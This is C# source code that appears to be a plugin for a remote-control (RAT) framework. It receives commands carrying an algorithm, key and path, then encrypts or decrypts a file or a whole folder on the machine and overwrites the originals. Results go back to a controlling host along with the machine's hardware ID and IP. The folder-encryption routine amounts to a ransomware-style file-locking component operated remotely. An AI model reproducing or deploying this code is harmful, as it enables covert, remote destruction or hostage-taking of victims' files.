using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System;
using System.IO;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class Helpers
    {
        private CryptographyPacket cryptographyPacket { get; set; }
        private delegate CryptographyPacket Operation(CryptographyPacket cryptographyPacket, bool encryptionOrDecryption);
        private Operation operation { get; set; }
        private void ClientSender(Host host, string key, IPacket packet)
        {
            ClientHandler clientHandler = new ClientHandler(host, key);
            clientHandler.ConnectStart();
            while (!clientHandler.Connected)
                Thread.Sleep(1000);

            clientHandler.SendPacket(packet);
        }

        internal class FileOperator : Helpers
        {
            internal FileOperator(CryptographyPacket cryptographyPacket, Host host, string key, bool encryptionOrDecryption) 
            {
                this.cryptographyPacket = cryptographyPacket;
                this.operation = new Operation(Worker);
                IAsyncResult result = operation.BeginInvoke(cryptographyPacket, encryptionOrDecryption, null, null);
                result.AsyncWaitHandle.WaitOne();
                CryptographyPacket endOperationAsync = operation.EndInvoke(result);
                endOperationAsync.baseIp = cryptographyPacket.baseIp;
                endOperationAsync.HWID = cryptographyPacket.HWID;
                endOperationAsync.path = cryptographyPacket.path;
                endOperationAsync.isPathAFolder = cryptographyPacket.isPathAFolder;
                ClientSender(host, key, endOperationAsync);
            }

            private CryptographyPacket Worker(CryptographyPacket cryptographyPacket, bool encryptionOrDecryption) 
            {
                CryptographyPacket cryptographyResult;
                if (encryptionOrDecryption)
                    cryptographyResult = new CryptographyPacket(PacketType.CRP_ENCRYPTION);
                else
                    cryptographyResult = new CryptographyPacket(PacketType.CRP_DECRYPTION);
                try
                {
                    byte[] fileOperation = Plugin.Operation.RunEncryptionDecryption(cryptographyPacket.algorithm, encryptionOrDecryption, cryptographyPacket.path, cryptographyPacket.key);
                    System.IO.File.WriteAllBytes(cryptographyPacket.path, fileOperation);
                    cryptographyResult.success = true;
                }
                catch (Exception)
                {
                    cryptographyResult.success = false;
                }
                return cryptographyResult;
            }
        }

        internal class FolderOperator : Helpers
        {
            internal FolderOperator(CryptographyPacket cryptographyPacket, Host host, string key, bool encryptionOrDecryption)
            {
                this.cryptographyPacket = cryptographyPacket;
                this.operation = new Operation(Worker);
                IAsyncResult result = operation.BeginInvoke(cryptographyPacket, encryptionOrDecryption, null, null);
                CryptographyPacket endOperationAsync = operation.EndInvoke(result);
                endOperationAsync.baseIp = cryptographyPacket.baseIp;
                endOperationAsync.HWID = cryptographyPacket.HWID;
                endOperationAsync.path = cryptographyPacket.path;
                endOperationAsync.isPathAFolder = cryptographyPacket.isPathAFolder;
                ClientSender(host, key, endOperationAsync);
            }
            private CryptographyPacket Worker(CryptographyPacket cryptographyPacket, bool encryptionOrDecryption)
            {
                CryptographyPacket cryptographyResult;
                if (encryptionOrDecryption)
                {
                    cryptographyResult = new CryptographyPacket(PacketType.CRP_ENCRYPTION);
                    foreach (string file in Directory.GetFiles(cryptographyPacket.path)) 
                    {
                        try
                        {
                            byte[] fileOperation = Plugin.Operation.RunEncryptionDecryption(cryptographyPacket.algorithm, encryptionOrDecryption, file, cryptographyPacket.key);
                            System.IO.File.WriteAllBytes(file, fileOperation);
                            cryptographyResult.filesPath.Add(file, true);
                        }
                        catch
                        {
                            cryptographyResult.filesPath.Add(file, false);
                        }
                    }
                }
                else
                {
                    cryptographyResult = new CryptographyPacket(PacketType.CRP_DECRYPTION);
                    foreach (string file in Directory.GetFiles(cryptographyPacket.path))
                    {
                        try
                        {
                            byte[] fileOperation = Plugin.Operation.RunEncryptionDecryption(cryptographyPacket.algorithm, encryptionOrDecryption, file, cryptographyPacket.key);
                            System.IO.File.WriteAllBytes(file, fileOperation);
                            cryptographyResult.filesPath.Add(file, true);
                        }
                        catch
                        {
                            cryptographyResult.filesPath.Add(file, false);
                        }
                    }
                }
                return cryptographyResult;
            }
        }
    }
}
